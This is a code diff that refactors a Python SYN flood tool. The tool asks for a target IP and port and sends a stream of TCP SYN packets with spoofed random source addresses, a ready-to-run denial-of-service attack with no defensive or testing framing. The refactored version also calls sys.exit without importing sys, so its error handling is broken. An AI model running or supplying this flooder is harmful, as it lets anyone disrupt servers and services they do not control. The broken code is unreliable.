@@ -1,66 +1,54 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 # Emre Ovunc
 # info@emreovunc.com
 # Python3 SYN Flood Tool
 
 from os import system
 from sys import stdout
-from scapy.all import *
+from scapy.all import IP, TCP, send
 from random import randint
 
-def randomIP():
-	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
-	return ip
+def random_ip() -> str:
+    return ".".join(map(str, (randint(0, 255) for _ in range(4))))
 
+def rand_int() -> int:
+    return randint(1000, 9000)
 
-def randInt():
-	x = randint(1000,9000)
-	return x
+def syn_flood(dst_ip: str, dst_port: int, counter: int):
+    print("Packets are being sent...")
+    total = 0
+    for _ in range(counter):
+        ip_packet = IP(src=random_ip(), dst=dst_ip)
+        tcp_packet = TCP(sport=rand_int(), dport=dst_port, flags="S", seq=rand_int(), window=rand_int())
+        send(ip_packet/tcp_packet, verbose=False)
+        total += 1
+    stdout.write(f"\nTotal packets sent: {total}\n")
 
+def info() -> tuple:
+    system("clear")
+    print("#####################################")
+    print("#        github.com/EmreOvunc       #")
+    print("#####################################")
+    print("# Welcome to Python3 SYN Flood Tool #")
+    print("#####################################")
 
-def SYN_Flood(dstIP,dstPort,counter):
-	total = 0
-	print ("Packets are sending ...")
+    dst_ip = input("\nTarget IP: ")
+    try:
+        dst_port = int(input("Target Port: "))
+    except ValueError:
+        print("Invalid port number. Exiting.")
+        sys.exit(1)
 
-	for x in range (0,counter):
-		s_port = randInt()
-		s_eq = randInt()
-		w_indow = randInt()
-
-		IP_Packet = IP ()
-		IP_Packet.src = randomIP()
-		IP_Packet.dst = dstIP
-
-		TCP_Packet = TCP ()
-		TCP_Packet.sport = s_port
-		TCP_Packet.dport = dstPort
-		TCP_Packet.flags = "S"
-		TCP_Packet.seq = s_eq
-		TCP_Packet.window = w_indow
-
-		send(IP_Packet/TCP_Packet, verbose=0)
-		total+=1
-
-	stdout.write("\nTotal packets sent: %i\n" % total)
-
-
-def info():
-	system("clear")
-	print ("#####################################")
-	print ("#        github.com/EmreOvunc       #")
-	print ("#####################################")
-	print ("# Welcome to Python3 SYN Flood Tool #")
-	print ("#####################################")
-
-	dstIP = input ("\nTarget IP : ")
-	dstPort = input ("Target Port : ")
-
-	return dstIP,int(dstPort)
-
+    return dst_ip, dst_port
 
 def main():
-	dstIP,dstPort = info()
-	counter = input ("How many packets do you want to send : ")
-	SYN_Flood(dstIP,dstPort,int(counter))
+    dst_ip, dst_port = info()
+    try:
+        counter = int(input("How many packets do you want to send: "))
+    except ValueError:
+        print("Invalid number of packets. Exiting.")
+        sys.exit(1)
+    syn_flood(dst_ip, dst_port, counter)
 
-main()
+if __name__ == "__main__":
+    main()
